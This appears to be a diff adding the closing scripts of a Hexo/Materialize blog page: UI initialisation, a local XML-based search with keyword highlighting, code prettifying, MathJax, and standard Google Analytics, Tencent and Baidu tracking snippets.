+            $(".button-collapse").sideNav();
+            $(".category-menu").sideNav();
+
+            // 针对gallery post
+            $('.carousel').carousel({full_width: true});
+            $('.carousel-control.prev').click(function() {
+                $('.carousel').carousel('prev');
+            });
+            $('.carousel-control.next').click(function() {
+                $('.carousel').carousel('next');
+            });
+
+            // 文章目录
+            $('article').not('.simple-article').find('h1').add('h2').add('h3').add('h4').add('h5').add('h6').scrollSpy();
+
+            // 目录随屏幕滚动（防止目录过长越过footer）
+            var $toc = $('.toc');
+            var scrollTargetTop = 0;
+            $(window).scroll(function() {
+                var $activeLink = $toc.find('a.active.section');
+                if ($(window).scrollTop() < 100) {
+                    scrollTargetTop = 0;
+                } else {
+                    if ($activeLink[0]) {
+                        scrollTargetTop = $activeLink.offset().top - $toc.offset().top;
+                    }
+                }
+                $toc.css('top', '-' + scrollTargetTop + 'px');
+            });
+
+            // 修正文章目录的left-border颜色
+            var color = $('.table-of-contents-text').css('color');
+            $('.table-of-contents-link').css('border-left-color', color);
+
+            // 针对移动端做的优化：FAB按钮点击一下收回
+            if (/Android|webOS|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(navigator.userAgent)) {
+                $('.fixed-action-btn').addClass('click-to-toggle');
+            }
+            // 回到顶部
+            $('.btn-return-top').click(function() {
+                $('body, html').animate({
+                    scrollTop: 0
+                }, 500);
+            });
+
+            // 重置读书页面的Tab标签页的颜色
+            $('li.tab a').hover(function() {
+                $(this).toggleClass('text-lighten-4');
+            });
+            $('.indicator').addClass(' lighten-2');
+
+            
+            // 添加new标签
+            $('.menu-reading, .menu-about').append('<span class="new badge red"></span>');
+            
+
+            // 搜索功能
+            $('.modal-trigger').leanModal({
+                // 打开搜索框时自动聚焦
+                ready: function() {
+                    if ($('#search').is(":visible")) {
+                        $('#search-input').focus();
+                    }
+                }
+            });
+            var searchXml = "search.xml";
+            if (searchXml.length == 0) {
+             	searchXml = "search.xml";
+            }
+            var searchPath = "/" + searchXml;
+            initSearch(searchPath, 'search-input', 'search-result');
+        });
+
+        // 初始化搜索与匹配函数
+        var initSearch = function(path, search_id, content_id) {
+            'use strict';
+            $.ajax({
+                url: path,
+                dataType: "xml",
+                success: function(xmlResponse) {
+                    // get the contents from search data
+                    var datas = $("entry", xmlResponse).map(function() {
+                        return {
+                            title: $("title", this).text(),
+                            content: $("content", this).text(),
+                            url: $("url", this).text()
+                        };
+                    }).get();
+                    var $input = document.getElementById(search_id);
+                    var $resultContent = document.getElementById(content_id);
+                    $input.addEventListener('input', function() {
+                        var str = '<ul class=\"search-result-list\">';
+                        var keywords = this.value.trim().toLowerCase().split(/[\s\-]+/);
+                        $resultContent.innerHTML = "";
+                        if (this.value.trim().length <= 0) {
+                            return;
+                        }
+                        // perform local searching
+                        datas.forEach(function(data) {
+                            var isMatch = true;
+                            var content_index = [];
+                            var data_title = data.title.trim().toLowerCase();
+                            var data_content = data.content.trim().replace(/<[^>]+>/g, "").toLowerCase();
+                            var data_url = data.url;
+                            var index_title = -1;
+                            var index_content = -1;
+                            var first_occur = -1;
+                            // only match artiles with not empty titles and contents
+                            if (data_title != '' && data_content != '') {
+                                keywords.forEach(function(keyword, i) {
+                                    index_title = data_title.indexOf(keyword);
+                                    index_content = data_content.indexOf(keyword);
+                                    if (index_title < 0 && index_content < 0) {
+                                        isMatch = false;
+                                    } else {
+                                        if (index_content < 0) {
+                                            index_content = 0;
+                                        }
+                                        if (i == 0) {
+                                            first_occur = index_content;
+                                        }
+                                    }
+                                });
+                            }
+                            // show search results
+                            if (isMatch) {
+                                keywords.forEach(function(keyword) {
+                                    var regS = new RegExp(keyword, "gi");
+                                    data_title = data_title.replace(regS, "<span class=\"search-keyword red lighten-2\">" + keyword + "</span>");
+                                });
+
+                                str += "<li><a href='" + data_url + "' class='search-result-title'>" + data_title + "</a>";
+                                var content = data.content.trim().replace(/<[^>]+>/g, "");
+                                if (first_occur >= 0) {
+                                    // cut out 100 characters
+                                    var start = first_occur - 20;
+                                    var end = first_occur + 80;
+                                    if (start < 0) {
+                                        start = 0;
+                                    }
+                                    if (start == 0) {
+                                        end = 100;
+                                    }
+                                    if (end > content.length) {
+                                        end = content.length;
+                                    }
+                                    var match_content = content.substring(start, end);
+                                    // highlight all keywords
+                                    keywords.forEach(function(keyword) {
+                                        var regS = new RegExp(keyword, "gi");
+                                        match_content = match_content.replace(regS, "<span class=\"search-keyword red lighten-2\">" + keyword + "</span>");
+                                    });
+
+                                    str += "<p class=\"search-result\">..." + match_content + "...</p>"
+                                }
+                                str += "</li>";
+                            }
+                        });
+                        str += "</ul>";
+                        $resultContent.innerHTML = str;
+                    });
+                }
+            });
+        }
+    })(jQuery);
+</script>
+
+
+<script src="/js/prettify.js"></script>
+<script type="text/javascript">
+    $(document).ready(function() {
+        $("pre").addClass("prettyprint");
+        prettyPrint();
+    });
+</script>
+
+
+<script>
+    (function(i,s,o,g,r,a,m){i['GoogleAnalyticsObject']=r;i[r]=i[r]||function(){
+        (i[r].q=i[r].q||[]).push(arguments)},i[r].l=1*new Date();a=s.createElement(o),
+            m=s.getElementsByTagName(o)[0];a.async=1;a.src=g;m.parentNode.insertBefore(a,m)
+    })(window,document,'script','//www.google-analytics.com/analytics.js','ga');
+
+    ga('create', '119424621', 'auto');
+    ga('send', 'pageview');
+
+</script>
+
+
+
+<script type="text/javascript" src="http://tajs.qq.com/stats?sId=65311650" charset="UTF-8"></script>
+
+
+
+<script type="text/x-mathjax-config">
+MathJax.Hub.Config({
+  tex2jax: {inlineMath: [['$','$'], ['\\(','\\)']]}
+});
+</script>
+<script type="text/javascript" async
+  src="//cdn.mathjax.org/mathjax/latest/MathJax.js?config=TeX-MML-AM_CHTML">
+</script>
+
+
+<script>
+(function(){
+    var bp = document.createElement('script');
+    var curProtocol = window.location.protocol.split(':')[0];
+    if (curProtocol === 'https'){
+   bp.src = 'https://zz.bdstatic.com/linksubmit/push.js';
+  }
+  else{
+  bp.src = 'http://push.zhanzhang.baidu.com/push.js';
+  }
+    var s = document.getElementsByTagName("script")[0];
+    s.parentNode.insertBefore(bp, s);
+})();
+</script>
+
+	
+</body>
+</html>
